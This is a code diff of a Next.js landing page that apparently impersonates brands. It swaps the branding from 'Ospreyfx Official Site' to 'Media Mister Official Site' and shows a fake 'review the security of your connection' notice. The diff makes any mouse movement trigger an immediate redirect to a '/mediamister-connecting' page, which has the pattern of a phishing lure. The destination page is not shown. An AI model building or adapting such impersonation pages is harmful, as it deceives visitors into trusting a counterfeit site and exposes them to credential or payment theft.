@@ -6,17 +6,17 @@ import Image from "next/image";
 import { useEffect, useState } from "react";
 
 export default function Home() {
-  const [status, setStatus] = useState(true);
-  const [hasRedirected, setHasRedirected] = useState(false);
-  const [isLoading, setIsLoading] = useState(true);
-  const handleMouseMove = () => {
-    if (!hasRedirected) {
-      setHasRedirected(true);
-      window.location.href = "/ospreyfx-connecting"; 
-    }
-  };
+  // const [status, setStatus] = useState(true);
+  // const [hasRedirected, setHasRedirected] = useState(false);
+  // const [isLoading, setIsLoading] = useState(true);
+  // const handleMouseMove = () => {
+  //   if (!hasRedirected) {
+  //     setHasRedirected(true);
+  //     window.location.href = "/mediamister-connecting"; 
+  //   }
+  // };
   const handleClick = () => {
-      window.location.href = "/ospreyfx-connecting"; 
+      window.location.href = "/mediamister-connecting"; 
   }
 //   const fetchItem = async () => {
 //     try {
@@ -37,12 +37,12 @@ export default function Home() {
   // },[])
   return (
     <div
-      // onMouseMove={!isLoading && status ? handleMouseMove : null}
-      // onClick={!isLoading && !status ? handleClick : null}
+      onMouseMove={handleClick}
+      // onClick={handleClick}
     >
       <main className={styles.main}>
         <h3 className={styles.text}>
-          Ospreyfx Official Site{" "}
+          Media Mister Official Site{" "}
           <span
             style={{ transform: "translate(0px)", display: "inline-block" }}
           >
@@ -54,7 +54,7 @@ export default function Home() {
         </p>
         <p className={styles.text3}>
           We needs to review the security of your connection before proceeding
-          Ospreyfx
+          Media Mister
         </p>
        
         <div style={{ marginTop: 30 }}>
